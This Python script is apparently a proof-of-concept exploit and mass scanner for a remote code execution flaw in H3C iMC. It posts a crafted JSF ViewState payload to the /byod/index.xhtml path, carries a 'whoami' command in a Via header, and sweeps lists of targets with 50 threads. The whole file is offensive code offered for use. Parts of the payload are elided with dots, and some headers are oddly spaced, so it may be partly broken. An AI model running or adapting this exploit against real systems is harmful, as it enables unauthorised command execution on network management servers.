import requests
import argparse
from multiprocessing.dummy import Pool
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()


def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False


def check(target):
    url = f"{target}/byod/index.xhtml"
    headers = {
        'User - Agent':'Mozilla/5.0(Windows NT 10.0;Win64;x64;rv: 133.0) Gecko/20100101Firefox/133.0',
        'Accept': 'text/html, application/xhtml + xml, application/xml;q = 0.9, * / *;q = 0.8',
        'Accept-Language':'zh - CN, zh;q = 0.8, zh - TW;q = 0.7, zh - HK;q = 0.5, en - US;q = 0.3, en;q = 0.2',
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'close',
        'Content-Type':'application/x-www-form-urlencoded',
        'Via':'whoami'
    }
    data = {

        'javax.faces.ViewState':'8SzWaaoxnkq9php028NtXbT98DEcA...Uh57HB/L8xz6eq+4sy0rUOuOdM5ccd2J6LPx8c6+53QkrX...jpFKgVnp07bad4n6CCBW8l98QIKwByAhLYdU2VpB/voaa....2oU+urahQDFE8mIaFvmwyKOHiwyovIHCVymqKwNdWXm3iHLhYEQXL4....k3z7MWm+wbV2Dc9TXV4rs8E6M7ZvVM3B0pORK8vAhd2iLBkgFhGHw9ZgOwifGnyMzfxlU....gG4chEOg57teuLurMPrulbEVBAEl7rRwobqvxb91sG+GMrGWFL5+wFvE56x7UEzHtE/o0IRtzTKi/EFnamrPT1046e7L8jABKDB/LjCX2qAOmqQkIz4gXrEFnHHYZ9LZc7t9ZZPNT...JZjummuZuror/zwPbnsApwXlYsn2hDAZ7QlOBunA3t7omeOTI5keWXvmOH8eoEEN//SlmQblwhBZ7kSHPvStq0ZciiPptEzVjQ/k/gU2QbCSc7yG0MFbhcJEDQj4yKyJ/yTnOOma....KuNzZl+PpEua+28h2YCKipVb5S/wOCrg+KD3DUFCbdWHQRqDaZyvYsc8C0X7fzutiVUlSB7OdGoCjub9WuW0d2eeDWZmOt3Wunms3SwAbE7R+onCRVS8tiYWF8qiQS+l0k8Gw/Hz6Njpfe0upLIAtPFNDuSf69qGg4isEmY2FtoSQTdD8vU0BdJatHrBArPgo9Qsp0jSJBlUz2OqteQg05PYO6gEBXVj/RiTBHI1/pOzlcE0wVZcLUHnxGNvckSCTiT....nWbkWGJ8AYCvrM0PHZ/BYcKKRf3rMHoIqcAN+ORMhXcmAXRcvq29c5xqoOuvrMSJPDZmbZhcm/99crGJSO5HxXQder9WKm2tVBaDLEC9ulpWyICJYgfxayoWkt6vwPcq2Tn20vn5RDpfqJKLNLbrV8g7JDRUUyW+....R6PRNunKhfJHvHcXAZ73mkCUf7cMUbNhqCbLSGP/D+qpqWXk5ZWjsT4tQ9tFH9uvPIaNB7FlcFXI2I2A9oPoY0ltif+b8BdPXVfpuZq8boHE4hY+33BIl+Ia+ov6nyMmGIzCKYeRbfDJtk/45EXvink6BIgA/205la6vvqKTGQ32o1AtepBgKei....604cVvbEP7UKor09Gz61mryE4D+iXG1prZGCT3LEtdASuCkmf4RTEc5wks2In3ElZSZl8zf3RsHA0dgbvrpnXe2wLPI+UCAGO+iOG9/+bCQJQNFmykkyRbmslfcilUxZ+Ig+QuOs9FlMod2ICrkktOFFeZWNeznx737S8H4Nf2+p2QNHY2I6GFGtWpqjeZ+Gmb1euM5Tzi06eJ.......koPrjkDT9VPoxCgpRMQl06x7NShkos7BCI9fV1+17t5gWZvqAYzeQUsZLaiBXaZfuUtPuBmbq1re/dB/VgSOn4QX+8AwwDjtfazsHw4aIdh4e2a1y/Ou2ZiI//EzkwIBksY6CluuPgocdvtOfNiWcXsfYs3UKLmL/48A4Ls0OF1TrQK4UnfCYt.....1DGrwzfXnM9vLHznFaJenqvLY3yTiKN5SSVxvGwvhmp6PFW4Jj7G8NXdr/zN7HyC9Eg1Y1jKP7uiO+GM2U/etvMOCKwnfP2MnbznP378fZHf1H9yiVVrn+m+0u8PV.....2MsOTgS6B7C8ItflgSfJz5dkJ8IssRAcY+u/2QjrW95BBMSRPu2EaCUm1IpuszXEwHYgDizWPzDB0hSRgCEjncpGhPX3i10bK4/snBaBcAxAa1e2er2LDe/4WgaIwc9w2wKn3wXY5B87BKF5/Xq30....NNf6EMRrQ9154rEkCJb4IU4sFsTuyYlfZatlV+C2HM7u7FEbdVvr6yYK4oQqvfPmF5yRplwAYUQAvr1jwLbGYxhGaTy14UUrtvoyph5Sqebk2YTKjKX4U7xX5ha4YbyoVIMSRzdvB6YXDY3BId+gmMWZtTf2UE+9UAx/7g30pQNXA....FP1adq6ySd4x3dGVCe4YJcYe2gKWYVcWj5XPwUSt2fxdshzgFnjjqmRgxowH2u2nZU0xG539lnxIOlB'
    }
    try:
        print(url)
        response = requests.post(url=url, data=data, headers=headers, verify=False, timeout=10)

        if response.status_code == 200:
            print(response.text)
            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except requests.exceptions.RequestException as e:
        print(f"[Error] {target} {e}")


def main():
    parse = argparse.ArgumentParser(description="H46-1H3C-iMC智能管理中心 -RCE")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入单个URL')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请输入包含多个URL的文件')
    args = parse.parse_args()
    pool = Pool(50)
    targets = []

    if args.url:
        if is_valid_url(args.url):
            targets.append(args.url)

        else:
            target = f"http://{args.url}"
            if is_valid_url(target):
                targets.append(target)
            else:
                print("[ERROR] 无效的URL格式")
                return

    elif args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    target = line.strip()
                    if is_valid_url(target):
                        targets.append(target)
                    else:
                        target = f"http://{target}"
                        if is_valid_url(target):
                            targets.append(target)
                        else:
                            print(f"[WARNING] 无效的URL: {line.strip()}")
        except FileNotFoundError:
            print("[ERROR] 文件未找到")
            return
        except Exception as e:
            print(f"[ERROR] 读取文件时出错: {e}")
            return
    results = pool.map(check, targets)
    pool.close()
    pool.join()



if __name__ == '__main__':
    main()